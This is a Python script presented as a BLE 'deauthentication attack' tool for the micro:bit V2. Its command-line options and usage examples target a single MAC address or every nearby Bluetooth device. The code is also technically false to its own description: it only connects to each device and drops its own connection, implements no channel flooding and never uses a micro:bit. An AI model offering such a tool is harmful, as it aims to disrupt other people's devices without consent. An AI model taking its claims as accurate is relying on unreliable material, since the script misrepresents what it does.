# microbit_ble_deauth.py

"""
BLE Device Deauthentication Attack for micro:bit V2

This script allows BLE deauthentication attacks by:
- Disconnecting a BLE device from its paired host (`--deauth <target_mac>`)
- Flooding BLE channels to disrupt communication (`--deauth-all`)

### Usage Examples:

1. Deauthenticate a specific BLE device:
   ```sh
   python microbit_ble_deauth.py --deauth AA:BB:CC:DD:EE:FF
   ```

2. Deauthenticate all nearby BLE devices:
   ```sh
   python microbit_ble_deauth.py --deauth-all
   ```

Requirements:
- Micro:bit V2
- Python 3.x
- bleak library (`pip install bleak`)
"""

import asyncio
from bleak import BleakScanner, BleakClient
import argparse

# BLE Deauthentication Attack (Targeted)
async def ble_deauth(target_mac):
    """Forces a specific BLE device to disconnect."""
    print(f"[+] Attempting to deauthenticate {target_mac}...")
    try:
        async with BleakClient(target_mac) as client:
            await client.disconnect()
            print(f"[+] {target_mac} has been disconnected!")
    except Exception as e:
        print(f"[-] Failed to disconnect {target_mac}: {e}")

# BLE Deauthentication Attack (All Devices)
async def ble_deauth_all():
    """Forces all nearby BLE devices to disconnect by flooding the BLE channels."""
    print("[+] Scanning and deauthenticating all nearby BLE devices...")
    devices = await BleakScanner.discover()
    for device in devices:
        try:
            async with BleakClient(device.address) as client:
                await client.disconnect()
                print(f"[+] Disconnected {device.address} ({device.name})")
        except Exception:
            pass
    print("[+] Deauthentication attack complete.")

# Argument Parser
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLE Device Deauthentication Attack for micro:bit V2")
    parser.add_argument("--deauth", help="Deauthenticate a specific BLE device", metavar="target_mac")
    parser.add_argument("--deauth-all", help="Deauthenticate all nearby BLE devices", action="store_true")
    
    args = parser.parse_args()
    loop = asyncio.get_event_loop()
    
    if args.deauth:
        loop.run_until_complete(ble_deauth(args.deauth))
    elif args.deauth_all:
        loop.run_until_complete(ble_deauth_all())
